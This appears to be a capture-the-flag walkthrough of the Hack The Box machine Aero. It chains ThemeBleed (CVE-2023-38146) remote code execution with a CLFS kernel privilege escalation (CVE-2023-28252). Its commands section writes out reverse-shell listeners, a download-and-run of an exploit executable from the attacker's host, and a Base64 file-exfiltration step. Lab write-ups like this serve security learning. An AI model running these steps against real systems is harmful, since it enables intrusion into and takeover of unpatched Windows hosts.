## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)
- **Exploits Used**:
    
    - 🎨 **ThemeBleed** (CVE‑2023‑38146) – race‑condition on `.msstyles` _vrf.dll loading
    - 🐛 **CLFS EoP** (CVE‑2023‑28252) – Common Log File System token stealing
    - ⚙️ Local PrivEsc via Nokoyawa-style CLFS exploit

**Open Ports:**

- [80](HTTP)/tcp – HTTP (IIS + ARR/3.0)

---

## 🧠 TLDR

1. **Recon & Static** – Found IIS 10, a theme‑upload form allowing `.theme`/`.themepack` only.
2. **RCE via ThemeBleed** – Built a malicious DLL exporting `VerifyThemeVersion`, packaged it into a theme with ThemeBleed POC, ran the built‑in SMB server, uploaded to trigger a reverse shell as `aero\sam.emerson` 🎉
3. **EoP to SYSTEM** – Retrieved and reviewed CVE‑2023‑28252_POC, patched to drop a Base64‑powered PowerShell reverse shell, ran it on the box to escalate from user to `NT AUTHORITY\SYSTEM` 🚀
4. **Beyond Root** – Discovered use of `FileSystemWatcher` in `watchdog.ps1` for auto‑launching uploaded themes, showcasing automation via PowerShell events.
    

---

## 🧰 Tools

- **Port/Content Discovery**: `nmap`, `feroxbuster`
- **ThemeBleed Exploit**: [ThemeBleed.exe](https://github.com/example/ThemeBleed) (make_theme/make_themepack + servere
- **DLL Builder**: Visual Studio (C++ DLL project exporting `VerifyThemeVersion`)
- **Networking**: `nc -lvnp` for callback listener
- **EoP Exploit**: CLFS PoC (CVE‑2023‑28252) from Fortra
- **PowerShell**: `Invoke‑WebRequest`, `FileSystemWatcher`, `Convert::ToBase64String`

---

## 🚀 Commands

```bash
# 1) Recon
nmap -p- --min-rate 10000 -oA aero-full 10.10.11.237
nmap -p80 -sCV     10.10.11.237

# 2) Build & Deploy ThemeBleed RCE
#   • Compile ReverseShellDLL.dll exporting VerifyThemeVersion()
#   • Copy into POC repo: data/stage_3/
#   • Generate theme: 
./ThemeBleed.exe make_theme YOUR_IP exploit.theme
#   • Disable local SMB on attacker host (stop Server service) / reboot
#   • Run SMB server:
./ThemeBleed.exe server
#   • Upload exploit.theme via web form
nc -lvnp 4444           # catch shell as sam.emerson
```

```
# 3) Privilege Escalation via CLFS
#   • Exfiltrate CVE summary PDF:
[convert]::ToBase64String((Get-Content CVE-2023-28252_Summary.pdf -Encoding byte))
#   • Build CLFS exploit in VS (Release, MBCS)
#   • Download & execute on target:
iwr http://YOUR_IP/clfs_eop.exe -outfile clfs_eop.exe
.\clfs_eop.exe         # drops SYSTEM reverse shell

nc -lvnp 9001           # catch SYSTEM shell

# 4) Beyond Root – Automation Insight
#   • Review watchdog.ps1 using FileSystemWatcher in C:\inetpub\aero\uploads
```

---

## 📚 Lessons Learned

- 🎨 **ThemeBleed** shows how signed‐DLL checks can be raced via filesystem swap (_vrf.dll).
    
- 🐛 **CLFS Token Stealing** is a powerful kernel escape when patch KB5025224 is missing.
    
- ⚙️ **PowerShell FileSystemWatcher** eventing can automate “clicking” actions server‑side.
    
- 🛠️ Always inspect uploads & backups for local enum or creds, then chain to EoP.
    

---

## 📖 References

- [ThemeBleed (CVE‑2023‑38146) POC](https://github.com/0xdf/ThemeBleed)
    
- [Fortra CLFS EoP (CVE‑2023‑28252)](https://github.com/fortra/clfs-eop)
    
- [Microsoft Security Update Guide](https://msrc.microsoft.com/update-guide)
    
- [HTB Aero Discussion & Walkthrough](https://0xdf.gitlab.io/2023/09/28/htb-aero.html)